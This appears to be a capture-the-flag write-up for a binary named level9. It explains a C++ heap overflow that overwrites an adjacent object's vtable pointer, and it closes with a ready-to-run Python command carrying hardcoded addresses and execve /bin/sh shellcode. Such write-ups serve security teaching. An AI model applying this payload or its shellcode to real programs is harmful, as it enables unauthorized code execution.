# LEVEL9

## EXPLANATIONS

### BINARY BEHAVIOR

- program takes 1 argument

1. main calls `_Znwj` to allocate 2 heap zones of 108 bytes.
2. main calls `_ZN1NC2Ei` to fill those 2 heap zones with :
   - 1st heap zone `ptr1`:
     - `*ptr1 = &_ZTV1N` (function pointer)
     - `*(ptr1 + 104) = 5`
   - 2nd heap zone `ptr2` :
     - `*ptr2 = &_ZTV1N` (function pointer)
     - `*(ptr2 + 104) = 6`
3. main calls `_ZN1N13setAnnotationEPc`, which will copy `argv1` into `ptr1` from `ptr1 + 4`.
   - the size of this copy is controlled by argv1 length
4. main dereferences pointer stored in `*(ptr2 + 4)`
5. main dereferences resulting pointer to point to the actual function

### EXPLOIT STRATEGY

- As :
  - heap memory zones pointed by ptr1 and ptr2 are contiguous
  - we control the bytestring copied into ptr1
  - we control the length of this copy
- => We can overflow into ptr2
- As `*ptr2` is used as a double pointer :

  - we store address of `ptr1 + 4` into `*ptr2`
  - we store address of `ptr2 + 4` into `*(ptr1 + 4)`
  - from `ptr2 + 4` lies our shellcode

- When the main does the double dereferencing :
  - `ptr2 => ptr1+4 => ptr2+4 == shellcode`

### RUN COMMAND

```
python -c "print('\x08\x04\xa0\x7c'[::-1] + 'A' * 104 + '\x08\x04\xa0\x0c'[::-1] + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')" > /tmp/argv1_string
/home/user/level9/level9 $(cat /tmp/argv1_string)
```
